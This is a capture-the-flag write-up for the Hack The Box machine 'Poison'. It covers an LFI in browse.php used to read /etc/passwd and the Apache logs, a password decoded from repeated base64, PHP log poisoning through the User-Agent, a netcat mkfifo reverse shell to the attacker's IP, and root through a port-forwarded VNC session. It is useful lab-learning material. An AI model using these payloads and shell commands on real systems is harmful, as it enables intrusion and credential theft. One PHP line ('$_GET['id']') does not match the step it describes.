@@ -1,0 +1,133 @@
+HTB-Poison-Writeup.txt
+
+ip : 10.10.10.84
+
+Nmap
+----
+- nmap revealed two ports 
+	- 22 for ssh 
+	- 80 for http apache 
+
+Enumeration
+-----------
+- reading the heading in the site says that its used for testing php scripts 
+- we have a submit form which takes in the php scripts 
+- we do have a few scripts mentioned in the site for testing 
+- one of which is listfiles.php
+- when we enter listfiles.php into the submit form and click submit and it takes us to a different page to displays the output
+
+	http://10.10.10.84/browse.php?file=listfiles.php
+
+- possible LFI but will comeback to it later  
+- the file contains more php scripts one of which is  pwdbackup.txt
+- anything that says password is always interesting to us 
+- on submiting pwdbackup.txt to the submit form we get a long base64 encoded text
+- we decode it and the result is as follows 
+
+	data=$(cat pwd.b64);
+	for i in $(seq 1 13); 
+	do 
+	data=$(echo $data | tr -d ' ' | base64 -d); 
+	done; 
+	echo $data
+
+	Charix!2#4%6&8(0
+
+- we get a password
+
+	creds : Charix!2#4%6&8(0
+
+- we have a password but no username or login form to use it against
+- we go back to the LFI link from before
+
+	http://10.10.10.84/browse.php?file=listfiles.php
+
+- we can try to read the /etc/passwd file using this link
+- we do have to url encode the /
+- it will look like
+
+	http://10.10.10.84/browse.php?file=%2Fetc%2Fpasswd
+
+- we get the output 
+- we get a bunch of usernames from the /etc/passwd file
+- we got the username we needed
+
+Shell as charix
+---------------
+- we can ssh into the box as charix user using the password we found before
+
+creds : charix : Charix!2#4%6&8(0
+
+	ssh charix@10.10.10.84
+
+Intended way of getting the shell as www-data -> charix
+-------------------------------------------------------
+- we can try the username against the password we found earlier but lets enumerate a bit further 
+- we look at the phpinfo.php from the root page and found out that direct RFI is not possible 
+- we can try to elevate from LFI to RFI through log poisoning 
+- we can try log poisoning 
+- the idea behind log poisoning is to add some executable php into the logs and load them where php will be executed 
+- the user-agent field looks like a good candidate for this
+- we add the following command to our user-agent 
+
+	<?php system($_GET['cmd']) ?> 
+
+- we can view the log files of poison server from
+
+	 view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
+
+- we can see in the result that our OS command got executed
+- we can confirm this by replacing the cmd command with id command 
+
+	 <?php system($_GET['id']) ?>
+	 view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
+
+- and checking the response we can see that the id command got executed
+- we have confirmed RCE via log poisoning 
+- to get a reverse shell we can visit the following link through the browser or run the following curl command from the command line 
+
+	curl http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.16%209001%20%3E/tmp/f
+
+- start netcat 
+	
+	nc -nlvp 9001
+
+- we got the shell as www-data
+- since we have the password for the charix user we can ssh into the machine using the credentials 
+- grab the user flag
+
+Priv-esc
+--------
+- along with the user flag there is another zip file in the directory called secret
+- we try to unzip it but it asks for a password 
+- we tried the users password and it worked 
+- we unzip the file 
+- we view the file and its an extended ASCII file with some unreadable characters 
+- we keep that file aside for now until it proves to be useful for us later 
+- we try to checking listening ports on the machine and found port 5801 & 5901 running locally  
+
+	netstat -an | grep "LISTEN"
+
+- we google the port and found that the port belongs to VNC which is used for RDP service
+- confirming this with the command 
+	
+	ps -aux | grep vnc
+
+- we can see that VNC is running with root privilege, which might be the ticket to privilege escalation
+- since VNC connects to a GUI application its not possible to get a shell in command line 
+- we have to local port forward the port 5901 to our kali to use VNC shell
+- we do local port forwarding using the command 
+
+	ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+
+- now we can check for listening ports on kali using the command 
+
+	ss -lnpt
+
+- now we can try to connect to port 5901 through vncviewer using the file we obtained before from the zip file
+
+	vncviewer -passwd secret 127.0.0.1:5901
+
+- we got the vnc desktop 
+- we are root 
+- grab the root flag 
